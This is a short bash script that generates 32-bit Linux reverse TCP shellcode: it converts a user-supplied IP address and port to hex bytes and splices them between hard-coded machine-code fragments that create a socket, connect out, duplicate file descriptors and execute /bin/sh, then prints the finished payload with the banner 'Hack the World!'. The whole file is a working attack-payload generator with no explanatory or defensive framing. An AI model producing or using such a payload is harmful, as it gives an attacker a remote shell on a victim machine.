#!/bin/bash

if [ -z "$1" ] || [ -z "$2" ];
then
	echo "Usage: $0 <ip address> <port (decimal)>"
	exit
fi

echo
echo "[*] Doing magic with your IP address and port number"
echo "[*] Done"

shellcode1="\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x68"

# ------------- parsing IP Address --------------------#

first_octet=$(echo -n $1 | awk -F. '{print $1}')
second_octet=$(echo -n $1 | awk -F. '{print $2}')
third_octet=$(echo -n $1 | awk -F. '{print $3}')
fourth_octet=$(echo -n $1 | awk -F. '{print $4}')

byte_first_octet=$(echo "obase=16; $first_octet" | bc )
byte_second_octet=$(echo "obase=16; $second_octet" | bc )
byte_third_octet=$(echo "obase=16; $third_octet" | bc )
byte_fourth_octet=$(echo "obase=16; $fourth_octet" | bc )

ip+="\x$(printf "%02x\n" 0x"$byte_first_octet")"
ip+="\x$(printf "%02x\n" 0x"$byte_second_octet")"
ip+="\x$(printf "%02x\n" 0x"$byte_third_octet")"
ip+="\x$(printf "%02x\n" 0x"$byte_fourth_octet")"

shellcode2="\x66\x68"

# ----------- Parsing Port number --------------

port=$(echo "obase=16; $2" | bc )
port_1st_byte="\x${port:0:2}"
port_2nd_byte="\x${port:2:4}"

le_port="$port_1st_byte$port_2nd_byte" #  port 

shellcode3="\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

final_shellcode+="$shellcode1"
final_shellcode+="$ip"
final_shellcode+="$shellcode2"
final_shellcode+="$le_port"
final_shellcode+="$shellcode3"


printf "\nEnjoy this Reverse TCP Shellcode with the IP %s and port %s\n\n\"%s\"\n" $1 $2 $final_shellcode
echo


echo
echo "--------------------"
echo "[*] Hack the World!"
echo "--------------------"
echo





